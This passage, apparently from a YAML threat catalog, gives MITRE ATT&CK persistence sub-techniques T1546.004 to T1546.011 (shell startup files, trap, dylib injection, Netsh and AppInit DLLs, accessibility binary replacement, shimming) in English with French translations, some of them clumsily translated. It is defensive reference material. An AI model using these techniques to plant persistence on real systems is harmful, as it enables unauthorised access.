      \ the shell exits appropriately. \n\nAdversaries may attempt to establish persistence\
      \ by inserting commands into scripts automatically executed by shells. Using\
      \ bash as an example, the default shell for most GNU/Linux systems, adversaries\
      \ may add commands that launch malicious binaries into the <code>/etc/profile</code>\
      \ and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation:\
      \ bencane blog bashrc) These files typically require root permissions to modify\
      \ and are executed each time any shell on a system launches. For user level\
      \ permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>,\
      \ <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when\
      \ a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation:\
      \ Linux manual bash invocation) Since the system only executes the first existing\
      \ file in the listed order, adversaries have used <code>~/.bash_profile</code>\
      \ to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code>\
      \ file which is additionally executed if the connection is established remotely\
      \ or an additional interactive shell is opened, such as a new tab in the command-line\
      \ interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation:\
      \ Magento) Some malware targets the termination of a program to trigger execution,\
      \ adversaries can use the <code>~/.bash_logout</code> file to execute malicious\
      \ commands at the end of a session. \n\nFor macOS, the functionality of this\
      \ technique is similar but may leverage zsh, the default shell for macOS 10.15+.\
      \ When the Terminal.app is opened, the application launches a zsh login shell\
      \ and a zsh interactive shell. The login shell configures the system environment\
      \ using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>,\
      \ and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation:\
      \ code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login\
      \ shell then configures the user environment with <code>~/.zprofile</code> and\
      \ <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code>\
      \ to configure the user environment. Upon exiting, <code>/etc/zlogout</code>\
      \ and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes\
      \ <code>/etc/bashrc</code> on startup.\nhttps://attack.mitre.org/techniques/T1546/004"
    translations:
      fr:
        name: Unix Shell Configuration Modification
        description: "Les attaquants peuvent s'assurer une persistance en ex\xE9cutant\
          \ des commandes malveillantes d\xE9clench\xE9es par le shell d'un utilisateur.\
          \ Les [shells Unix](https://attack.mitre.org/techniques/T1059/004) des utilisateurs\
          \ ex\xE9cutent plusieurs scripts de configuration \xE0 diff\xE9rents moments\
          \ de la session, en fonction des \xE9v\xE9nements. Par exemple, lorsqu'un\
          \ utilisateur ouvre une interface en ligne de commande ou se connecte \xE0\
          \ distance (par exemple via SSH), un shell de connexion est lanc\xE9. Le\
          \ shell de connexion ex\xE9cute des scripts provenant du syst\xE8me (<code>/etc</code>)\
          \ et du r\xE9pertoire personnel de l\u2019utilisateur (<code>~/</code>)\
          \ afin de configurer l\u2019environnement. Tous les shells de connexion\
          \ d\u2019un syst\xE8me utilisent /etc/profile lors de leur lancement. Ces\
          \ scripts de configuration s\u2019ex\xE9cutent avec les droits d\u2019acc\xE8\
          s de leur r\xE9pertoire et servent souvent \xE0 d\xE9finir des variables\
          \ d\u2019environnement, \xE0 cr\xE9er des alias et \xE0 personnaliser l\u2019\
          environnement de l\u2019utilisateur. Lorsque le shell se ferme ou s\u2019\
          arr\xEAte, des scripts de shell suppl\xE9mentaires sont ex\xE9cut\xE9s pour\
          \ garantir que le shell se ferme correctement. \n\nLes attaquants peuvent\
          \ tenter d\u2019assurer la persistance de leur pr\xE9sence en ins\xE9rant\
          \ des commandes dans des scripts ex\xE9cut\xE9s automatiquement par les\
          \ shells. Prenons l\u2019exemple de bash, le shell par d\xE9faut de la plupart\
          \ des syst\xE8mes GNU/Linux : les attaquants peuvent ajouter des commandes\
          \ lan\xE7ant des binaires malveillants dans les fichiers <code>/etc/profile</code>\
          \ et <code>/etc/profile.d</code>. (R\xE9f\xE9rence : intezer-kaiji-malware)\
          \ (R\xE9f\xE9rence : blog de bencane sur bashrc) Ces fichiers n\xE9cessitent\
          \ g\xE9n\xE9ralement des droits root pour \xEAtre modifi\xE9s et sont ex\xE9\
          cut\xE9s \xE0 chaque fois qu\u2019un shell est lanc\xE9 sur le syst\xE8\
          me. Pour les droits au niveau utilisateur, les attaquants peuvent ins\xE9\
          rer des commandes malveillantes dans <code>~/.bash_profile</code>, <code>~/.bash_login</code>\
          \ ou <code>~/.profile</code>, qui sont charg\xE9s lorsqu\u2019un utilisateur\
          \ ouvre une interface en ligne de commande ou se connecte \xE0 distance.\
          \ (R\xE9f\xE9rence : anomali-rocke-tactics) (Source : manuel Linux sur l\u2019\
          invocation de bash) \xC9tant donn\xE9 que le syst\xE8me n\u2019ex\xE9cute\
          \ que le premier fichier existant dans l\u2019ordre indiqu\xE9, les attaquants\
          \ ont utilis\xE9 <code>~/.bash_profile</code> pour garantir l\u2019ex\xE9\
          cution. Ils ont \xE9galement exploit\xE9 le fichier <code>~/.bashrc</code>,\
          \ qui est ex\xE9cut\xE9 en plus si la connexion est \xE9tablie \xE0 distance\
          \ ou si un shell interactif suppl\xE9mentaire est ouvert, comme un nouvel\
          \ onglet dans l\u2019interface en ligne de commande. (R\xE9f\xE9rence :\
          \ Tsunami)(R\xE9f\xE9rence : anomali-rocke-tactics)(R\xE9f\xE9rence : anomali-linux-rabbit)(R\xE9\
          f\xE9rence : Magento) Certains logiciels malveillants ciblent la fin d\u2019\
          un programme pour d\xE9clencher leur ex\xE9cution ; les attaquants peuvent\
          \ utiliser le fichier <code>~/.bash_logout</code> pour ex\xE9cuter des commandes\
          \ malveillantes \xE0 la fin d\u2019une session. \n\nSous macOS, le fonctionnement\
          \ de cette technique est similaire, mais peut s'appuyer sur zsh, le shell\
          \ par d\xE9faut de macOS 10.15 et versions ult\xE9rieures. \xC0 l'ouverture\
          \ de Terminal.app, l'application lance un shell de connexion zsh et un shell\
          \ interactif zsh. Le shell de connexion configure l\u2019environnement syst\xE8\
          me \xE0 l\u2019aide des fichiers <code>/etc/profile</code>, <code>/etc/zshenv</code>,\
          \ <code>/etc/zprofile</code> et <code>/etc/zlogin</code>. (R\xE9f\xE9rence\
          \ : ScriptingOSX zsh) (R\xE9f\xE9rence : PersistentJXA_leopitt) (R\xE9f\xE9\
          rence : code_persistence_zsh) (R\xE9f\xE9rence : macOS MS office sandbox\
          \ escape) Le shell de connexion configure ensuite l\u2019environnement utilisateur\
          \ \xE0 l\u2019aide de <code>~/.zprofile</code> et <code>~/.zlogin</code>.\
          \ Le shell interactif utilise le fichier <code>~/.zshrc</code> pour configurer\
          \ l\u2019environnement utilisateur. \xC0 la fermeture, les fichiers <code>/etc/zlogout</code>\
          \ et <code>~/.zlogout</code> sont ex\xE9cut\xE9s. Pour les programmes h\xE9\
          rit\xE9s, macOS ex\xE9cute <code>/etc/bashrc</code> au d\xE9marrage.\nhttps://attack.mitre.org/techniques/T1546/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.005
    ref_id: T1546.005
    name: Trap
    description: 'Adversaries may establish persistence by executing malicious content
      triggered by an interrupt signal. The <code>trap</code> command allows programs
      and shells to specify commands that will be executed upon receiving interrupt
      signals. A common situation is a script allowing for graceful termination and
      handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.


      Adversaries can use this to register code to be executed when the shell encounters
      specific interrupts as a persistence mechanism. Trap commands are of the following
      format <code>trap ''command list'' signals</code> where "command list" will
      be executed when "signals" are received.(Citation: Trap Manual)(Citation: Cyberciti
      Trap Statements)

      https://attack.mitre.org/techniques/T1546/005'
    translations:
      fr:
        name: "Pi\xE8ge"
        description: "Les adversaires peuvent \xE9tablir la persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par un signal d\u2019interruption.\
          \ La commande <code>trap</code> permet aux programmes et aux shells de sp\xE9\
          cifier des commandes qui seront ex\xE9cut\xE9es lors de la r\xE9ception\
          \ des signaux d\u2019interruption. Une situation courante est un script\
          \ permettant une terminaison et une gestion gracieuses des interruptions\
          \ clavier courantes comme <code>ctrl+c</code> et <code>ctrl+d</code>.\n\n\
          Les adversaires peuvent utiliser cela pour enregistrer du code \xE0 ex\xE9\
          cuter lorsque le shell rencontre des interruptions sp\xE9cifiques, comme\
          \ m\xE9canisme de persistance. Les commandes de pi\xE8ge sont du format\
          \ suivant<code>, signaux de \xAB liste de commandes \xBB</code> o\xF9 la\
          \ \xAB liste de commandes \xBB sera ex\xE9cut\xE9e lorsque les \xAB signaux\
          \ \xBB sont re\xE7us. (Citation : Manuel des pi\xE8ges)(Citation : D\xE9\
          clarations de Cyberciti Trap)\nhttps://attack.mitre.org/techniques/T1546/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.006
    ref_id: T1546.006
    name: LC_LOAD_DYLIB Addition
    description: "Adversaries may establish persistence by executing malicious content\
      \ triggered by the execution of tainted binaries. Mach-O binaries have a series\
      \ of headers that are used to perform certain operations when a binary is loaded.\
      \ The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic\
      \ libraries (dylibs) to load during execution time. These can be added ad-hoc\
      \ to the compiled binary as long as adjustments are made to the rest of the\
      \ fields and dependencies.(Citation: Writing Bad Malware for OSX) There are\
      \ tools available to perform these changes.\n\nAdversaries may modify Mach-O\
      \ binary headers to load and execute malicious dylibs every time the binary\
      \ is executed. Although any changes will invalidate digital signatures on binaries\
      \ because the binary is being modified, this can be remediated by simply removing\
      \ the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019\
      t checked at load time.(Citation: Malware Persistence on OS X)\nhttps://attack.mitre.org/techniques/T1546/006"
    translations:
      fr:
        name: LC_LOAD_DYLIB Ajout
        description: "Les adversaires peuvent \xE9tablir leur persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par l\u2019ex\xE9cution de\
          \ binaires corrompus. Les binaires Mach-O poss\xE8dent une s\xE9rie d\u2019\
          en-t\xEAtes utilis\xE9s pour effectuer certaines op\xE9rations lors du chargement\
          \ d\u2019un binaire. L\u2019en-t\xEAte LC_LOAD_DYLIB dans un binaire Mach-O\
          \ indique \xE0 macOS et OS X quelles biblioth\xE8ques dynamiques (dylibs)\
          \ doivent se charger pendant le temps d\u2019ex\xE9cution. Celles-ci peuvent\
          \ \xEAtre ajout\xE9es ad hoc au binaire compil\xE9 \xE0 condition que des\
          \ ajustements soient apport\xE9s au reste des champs et d\xE9pendances.\
          \ (Citation : \xC9crire de mauvais malwares pour OSX) Il existe des outils\
          \ pour effectuer ces changements.\n\nLes adversaires peuvent modifier les\
          \ en-t\xEAtes binaires Mach-O pour charger et ex\xE9cuter des dylibs malveillants\
          \ \xE0 chaque ex\xE9cution du binaire. Bien que tout changement invalide\
          \ les signatures num\xE9riques sur les binaires car le binaire est modifi\xE9\
          , cela peut \xEAtre corrig\xE9 en supprimant simplement la commande LC_CODE_SIGNATURE\
          \ du binaire afin que la signature ne soit pas v\xE9rifi\xE9e au moment\
          \ du chargement. (Citation : Persistance du malware sur OS X)\nhttps://attack.mitre.org/techniques/T1546/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.007
    ref_id: T1546.007
    name: Netsh Helper DLL
    description: 'Adversaries may establish persistence by executing malicious content
      triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is
      a command-line scripting utility used to interact with the network configuration
      of a system. It contains functionality to add helper DLLs for extending functionality
      of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper
      DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.


      Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary
      code in a persistent manner. This execution would take place anytime netsh.exe
      is executed, which could happen automatically, with another persistence technique,
      or if other software (ex: VPN) is present on the system that executes netsh.exe
      as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation:
      Demaske Netsh Persistence)

      https://attack.mitre.org/techniques/T1546/007'
    translations:
      fr:
        name: Netsh Helper DLL
        description: "Les adversaires peuvent \xE9tablir la persistance en ex\xE9\
          cutant du contenu malveillant d\xE9clench\xE9 par des DLL Netsh Helper.\
          \ Netsh.exe (\xE9galement appel\xE9 Netshell) est un utilitaire de script\
          \ en ligne de commande utilis\xE9 pour interagir avec la configuration r\xE9\
          seau d\u2019un syst\xE8me. Il contient des fonctionnalit\xE9s permettant\
          \ d\u2019ajouter des DLL d\u2019aide pour \xE9tendre la fonctionnalit\xE9\
          \ de l\u2019utilitaire. (Citation : TechNet Netsh) Les chemins vers les\
          \ DLL netsh.exe assistants enregistr\xE9s sont saisis dans le registre Windows\
          \ \xE0 <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nLes adversaires\
          \ peuvent utiliser netsh.exe DLL d\u2019assistance pour d\xE9clencher l\u2019\
          ex\xE9cution de code arbitraire de mani\xE8re persistante. Cette ex\xE9\
          cution aurait lieu \xE0 chaque fois que netsh.exe est ex\xE9cut\xE9, ce\
          \ qui pourrait se faire automatiquement, avec une autre technique de persistance,\
          \ ou si un autre logiciel (par exemple : VPN) est pr\xE9sent sur le syst\xE8\
          me qui ex\xE9cute netsh.exe dans le cadre de sa fonctionnalit\xE9 normale.\
          \ (Citation : Github Netsh Helper CS Beacon)(Citation : Demaske Netsh Persistance)\n\
          https://attack.mitre.org/techniques/T1546/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.008
    ref_id: T1546.008
    name: Accessibility Features
    description: 'Adversaries may establish persistence and/or elevate privileges
      by executing malicious content triggered by accessibility features. Windows
      contains accessibility features that may be launched with a key combination
      before a user has logged in (ex: when the user is on the Windows logon screen).
      An adversary can modify the way these programs are launched to get a command
      prompt or backdoor without logging in to the system.


      Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>,
      launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>,
      launched when the Windows + U key combination is pressed. The sethc.exe program
      is often referred to as "sticky keys", and has been used by adversaries for
      unauthenticated access through a remote desktop login screen. (Citation: FireEye
      Hikit Rootkit)


      Depending on the version of Windows, an adversary may take advantage of these
      features in different ways. Common methods used by adversaries include replacing
      accessibility feature binaries or pointers/references to these binaries in the
      Registry. In newer versions of Windows, the replaced binary needs to be digitally
      signed for x64 systems, the binary must reside in <code>%systemdir%\</code>,
      and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation:
      DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012)
      debugger method was likely discovered as a potential workaround because it does
      not require the corresponding accessibility feature binary to be replaced.


      For simple binary replacement on Windows XP and later as well as and Windows
      Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>)
      may be replaced with "cmd.exe" (or another program that provides backdoor access).
      Subsequently, pressing the appropriate key combination at the login screen while
      sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)
      will cause the replaced file to be executed with SYSTEM privileges. (Citation:
      Tilbury 2014)


      Other accessibility features exist that may also be leveraged in a similar fashion:
      (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)


      * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>

      * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>

      * Narrator: <code>C:\Windows\System32\Narrator.exe</code>

      * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>

      * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

      https://attack.mitre.org/techniques/T1546/008'
    translations:
      fr:
        name: "Fonctionnalit\xE9s d\u2019accessibilit\xE9"
        description: "Les adversaires peuvent \xE9tablir leur persistance et/ou augmenter\
          \ leurs privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9\
          \ par des fonctionnalit\xE9s d\u2019accessibilit\xE9. Windows contient des\
          \ fonctionnalit\xE9s d\u2019accessibilit\xE9 qui peuvent \xEAtre lanc\xE9\
          es avec une combinaison de touches avant que l\u2019utilisateur ne se soit\
          \ connect\xE9 (par exemple : lorsque l\u2019utilisateur est sur l\u2019\xE9\
          cran de connexion Windows). Un adversaire peut modifier la fa\xE7on dont\
          \ ces programmes sont lanc\xE9s pour obtenir une invite de commande ou une\
          \ porte d\xE9rob\xE9e sans se connecter au syst\xE8me.\n\nDeux programmes\
          \ d\u2019accessibilit\xE9 courants sont <code>C\_:\\Windows\\System32\\\
          sethc.exe</code>, lanc\xE9 lorsque la touche majus est enfonc\xE9e cinq\
          \ fois, et <code>C\_:\\Windows\\System32\\utilman.exe</code>, lanc\xE9 lorsque\
          \ la combinaison Windows + U est press\xE9e. Le programme sethc.exe est\
          \ souvent appel\xE9 \xAB sticky keys \xBB et a \xE9t\xE9 utilis\xE9 par\
          \ des adversaires pour un acc\xE8s non authentifi\xE9 via un \xE9cran de\
          \ connexion \xE0 distance. (Citation : Rootkit FireEye Hikit)\n\nSelon la\
          \ version de Windows, un adversaire peut tirer parti de ces fonctionnalit\xE9\
          s de diff\xE9rentes mani\xE8res. Les m\xE9thodes courantes utilis\xE9es\
          \ par les adversaires incluent le remplacement des binaires de caract\xE9\
          ristiques d\u2019accessibilit\xE9 ou des pointeurs/r\xE9f\xE9rences \xE0\
          \ ces binaires dans le Registre. Dans les versions plus r\xE9centes de Windows,\
          \ le binaire remplac\xE9 doit \xEAtre sign\xE9 num\xE9riquement pour les\
          \ syst\xE8mes x64, le binaire doit r\xE9sider dans <code>%systemdir\_%\\\
          </code>, et doit \xEAtre prot\xE9g\xE9 par la protection des fichiers ou\
          \ des ressources Windows (WFP/WRP). (Citation : DEFCON2016 Sticky Keys)\
          \ La m\xE9thode de d\xE9boguage [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012)\
          \ a probablement \xE9t\xE9 d\xE9couverte comme solution de contournement\
          \ potentielle car elle ne n\xE9cessite pas de remplacer le binaire de caract\xE9\
          ristiques d\u2019accessibilit\xE9 correspondant.\n\nPour un simple remplacement\
          \ binaire sur Windows XP et versions ult\xE9rieures ainsi que sur Windows\
          \ Server 2003/R2 et versions ult\xE9rieures, par exemple, le programme (par\
          \ exemple, <code>C\_:\\Windows\\System32\\utilman.exe</code>) peut \xEA\
          tre remplac\xE9 par \xAB cmd.exe \xBB (ou un autre programme offrant un\
          \ acc\xE8s par la porte d\xE9rob\xE9e). Par la suite, appuyer sur la combinaison\
          \ de touches appropri\xE9e \xE0 l\u2019\xE9cran de connexion tout en \xE9\
          tant assis au clavier ou connect\xE9 via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
          \ entra\xEEne l\u2019ex\xE9cution du fichier remplac\xE9 avec les privil\xE8\
          ges SYSTEM. (Citation : Tilbury 2014)\n\nD\u2019autres fonctionnalit\xE9\
          s d\u2019accessibilit\xE9 existent et peuvent \xE9galement \xEAtre exploit\xE9\
          es de mani\xE8re similaire : (Citation : DEFCON2016 Sticky Keys) (Citation\
          \ : Abus d\u2019accessibilit\xE9 du narrateur)\n\n* Clavier \xE0 l\u2019\
          \xE9cran : <code>C\_:\\Windows\\System32\\osk.exe</code>\n* Loupe : <code>C\
          \ :\\Windows\\System32\\Magnify.exe</code>\n* Narrateur : <code>C : \\Windows\\\
          System32\\Narrator.exe</code>\n* Commutateur d\u2019affichage : <code>C\_\
          :\\Windows\\System32\\DisplaySwitch.exe</code>\n* Commutateur d\u2019applications\
          \ : <code>C\_:\\Windows\\System32\\AtBroker.exe</code>\nhttps://attack.mitre.org/techniques/T1546/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.009
    ref_id: T1546.009
    name: AppCert DLLs
    description: 'Adversaries may establish persistence and/or elevate privileges
      by executing malicious content triggered by AppCert DLLs loaded into processes.
      Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code>
      Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
      Manager\</code> are loaded into every process that calls the ubiquitously used
      application programming interface (API) functions <code>CreateProcess</code>,
      <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>,
      or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)


      Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this
      value can be abused to obtain elevated privileges by causing a malicious DLL
      to be loaded and run in the context of separate processes on the computer. Malicious
      AppCert DLLs may also provide persistence by continuously being triggered by
      API activity.

      https://attack.mitre.org/techniques/T1546/009'
    translations:
      fr:
        name: DLL AppCert
        description: "Les adversaires peuvent \xE9tablir une persistance et/ou augmenter\
          \ leurs privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9\
          \ par des DLL AppCert charg\xE9s dans les processus. Les biblioth\xE8ques\
          \ \xE0 liaison dynamique (DLL) sp\xE9cifi\xE9es dans la cl\xE9 <code>du\
          \ registre AppCertDLLs</code> sous <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\\
          Control\\Session Manager\\</code> sont charg\xE9es dans chaque processus\
          \ qui appelle les fonctions omnipr\xE9sentes de l\u2019interface de programmation\
          \ d\u2019applications (API) <code>CreateProcess</code>, <code>CreateProcessAsUtilisateur</code>,\
          \ <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>\
          \ ou <code>WinExec</code>. (Citation : Injection de proc\xE9d\xE9 \xE9lastique\
          \ juillet 2017)\n\n\xC0 l\u2019instar de [Process Injection](https://attack.mitre.org/techniques/T1055),\
          \ cette valeur peut \xEAtre abus\xE9e pour obtenir des privil\xE8ges \xE9\
          lev\xE9s en provoquant le chargement et l\u2019ex\xE9cution d\u2019une DLL\
          \ malveillante dans le contexte de processus s\xE9par\xE9s sur l\u2019ordinateur.\
          \ Les DLL AppCert malveillants peuvent \xE9galement assurer la persistance\
          \ en \xE9tant continuellement d\xE9clench\xE9es par l\u2019activit\xE9 de\
          \ l\u2019API.\nhttps://attack.mitre.org/techniques/T1546/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.010
    ref_id: T1546.010
    name: AppInit DLLs
    description: "Adversaries may establish persistence and/or elevate privileges\
      \ by executing malicious content triggered by AppInit DLLs loaded into processes.\
      \ Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code>\
      \ value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\\
      Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\\
      Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded\
      \ by user32.dll into every process that loads user32.dll. In practice this is\
      \ nearly every program, since user32.dll is a very common library. (Citation:\
      \ Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these\
      \ values can be abused to obtain elevated privileges by causing a malicious\
      \ DLL to be loaded and run in the context of separate processes on the computer.\
      \ (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence\
      \ by continuously being triggered by API activity. \n\nThe AppInit DLL functionality\
      \ is disabled in Windows 8 and later versions when secure boot is enabled. (Citation:\
      \ AppInit Secure Boot)\nhttps://attack.mitre.org/techniques/T1546/010"
    translations:
      fr:
        name: DLL AppInit
        description: "Les adversaires peuvent \xE9tablir une persistance et/ou augmenter\
          \ leurs privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9\
          \ par les DLL AppInit charg\xE9s dans les processus. Les biblioth\xE8ques\
          \ \xE0 liaison dynamique (DLL) sp\xE9cifi\xE9es dans la valeur <code>AppInit_DLLs</code>\
          \ des cl\xE9s du registre <code>HKEY_LOCAL_MACHINE\\Logiciel\\Microsoft\\\
          Windows NT\\CurrentVersion\\Windows</code> ou <code>HKEY_LOCAL_MACHINE\\\
          Logiciel\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>\
          \ sont charg\xE9es par user32.dll dans chaque processus qui charge user32.dll.\
          \ En pratique, cela concerne presque tous les programmes, puisque user32.dll\
          \ est une biblioth\xE8que tr\xE8s courante. (Citation : Injection de proc\xE9\
          d\xE9 \xE9lastique juillet 2017)\n\n\xC0 l\u2019instar de l\u2019injection\
          \ de processus, ces valeurs peuvent \xEAtre abus\xE9es pour obtenir des\
          \ privil\xE8ges \xE9lev\xE9s en provoquant le chargement et l\u2019ex\xE9\
          cution d\u2019une DLL malveillante dans le contexte de processus s\xE9par\xE9\
          s sur l\u2019ordinateur. (Citation : Registre AppInit) Les DLL AppInit malveillants\
          \ peuvent \xE9galement assurer la persistance en \xE9tant continuellement\
          \ d\xE9clench\xE9s par l\u2019activit\xE9 de l\u2019API. \n\nLa fonctionnalit\xE9\
          \ DLL AppInit est d\xE9sactiv\xE9e dans Windows 8 et les versions ult\xE9\
          rieures lorsque le d\xE9marrage s\xE9curis\xE9 est activ\xE9. (Citation\
          \ : Boot s\xE9curis\xE9 AppInit)\nhttps://attack.mitre.org/techniques/T1546/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.011
    ref_id: T1546.011
    name: Application Shimming
    description: "Adversaries may establish persistence and/or elevate privileges\
      \ by executing malicious content triggered by application shims. The Microsoft\
      \ Windows Application Compatibility Infrastructure/Framework (Application Shim)\
      \ was created to allow for backward compatibility of software as the operating\
      \ system codebase changes over time. For example, the application shimming feature\
      \ allows developers to apply fixes to applications (without rewriting code)\
      \ that were created for Windows XP so that it will work with Windows 10. (Citation:\
      \ Elastic Process Injection July 2017)\n\nWithin the framework, shims are created\
      \ to act as a buffer between the program (or more specifically, the Import Address\
      \ Table) and the Windows OS. When a program is executed, the shim cache is referenced\
      \ to determine if the program requires the use of the shim database (.sdb).\
      \ If so, the shim database uses hooking to redirect the code as necessary in\
      \ order to communicate with the OS. \n\nA list of all shims currently installed\
      \ by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\\
      AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows\
      \ nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases\
      \ are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\\
      AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\\
      currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows\
      \ designed them to run in user mode so they cannot modify the kernel and you\
      \ must have administrator privileges to install a shim. However, certain shims\
      \ can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)\
      \ (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data\
      \ Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),\
      \ and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims\
      \ may allow an adversary to perform several malicious acts such as elevate privileges,\
      \ install backdoors, disable defenses like Windows Defender, etc. (Citation:\
      \ FireEye Application Shimming) Shims can also be abused to establish persistence\
      \ by continuously being invoked by affected programs.\nhttps://attack.mitre.org/techniques/T1546/011"
    translations:
      fr:
        name: "Scintille d\u2019application"
        description: "Les adversaires peuvent \xE9tablir une persistance et/ou augmenter\
          \ leurs privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9\
          \ par des cales d\u2019application. L\u2019Infrastructure/Framework de Compatibilit\xE9\
          \ des Applications Microsoft Windows (Application Shim) a \xE9t\xE9 cr\xE9\
          \xE9 pour permettre la r\xE9trocompatibilit\xE9 des logiciels au fil du\
          \ temps au fur et \xE0 mesure que la base de code du syst\xE8me d\u2019\
          exploitation \xE9volue. Par exemple, la fonction de calage d\u2019applications\
          \ permet aux d\xE9veloppeurs d\u2019appliquer des correctifs aux applications\
          \ (sans r\xE9\xE9crire le code) cr\xE9\xE9es pour Windows XP afin qu\u2019\
          elles fonctionnent avec Windows 10. (Citation : Injection de proc\xE9d\xE9\
          \ \xE9lastique juillet 2017)\n\nDans le cadre, des cales sont cr\xE9\xE9\
          es pour servir de tampon entre le programme (ou plus pr\xE9cis\xE9ment,\
          \ la table d\u2019adresses d\u2019importation) et le syst\xE8me d\u2019\
          exploitation Windows. Lorsqu\u2019un programme est ex\xE9cut\xE9, le cache\
          \ shim est r\xE9f\xE9renc\xE9 pour d\xE9terminer si le programme n\xE9cessite\
          \ l\u2019utilisation de la base de donn\xE9es shim (.sdb). Si oui, la base\
          \ de donn\xE9es shim utilise le hooking pour rediriger le code si n\xE9\
          cessaire afin de communiquer avec le syst\xE8me d\u2019exploitation. \n\n\
          Une liste de toutes les cales actuellement install\xE9es par l\u2019installateur\
          \ Windows par d\xE9faut (sdbinst.exe) est conserv\xE9e dans :\n\n* <code>%WINDIR\_\
          %\\AppPatch\\sysmain.sdb</code> et\n* <code>hklm\\software\\microsoft\\\
          windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nLes bases\
          \ de donn\xE9es personnalis\xE9es sont stock\xE9es dans :\n\n* <code>%WINDIR\_\
          %\\AppPatch\\custom & %WINDIR\_%\\AppPatch\\AppPatch\\AppPatch64\\Custom</code>\
          \ et\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\\
          custom</code>\n\nPour garder les cales s\xE9curis\xE9es, Windows les a con\xE7\
          ues pour fonctionner en mode utilisateur, donc elles ne peuvent pas modifier\
          \ le noyau et il faut avoir des privil\xE8ges administrateur pour installer\
          \ une cale. Cependant, certaines cales peuvent \xEAtre utilis\xE9es pour\
          \ [contourner le contr\xF4le du compte utilisateur](https://attack.mitre.org/techniques/T1548/002)\
          \ (UAC et RedirectEXE), injecter des DLL dans les processus (InjectDLL),\
          \ d\xE9sactiver la pr\xE9vention d\u2019ex\xE9cution des donn\xE9es (DisableNX)\
          \ et la gestion des exceptions structur\xE9es (DisableSEH), et intercepter\
          \ les adresses m\xE9moire (GetProcAddress).\n\nL\u2019utilisation de ces\
          \ cales peut permettre \xE0 un adversaire d\u2019effectuer plusieurs actes\
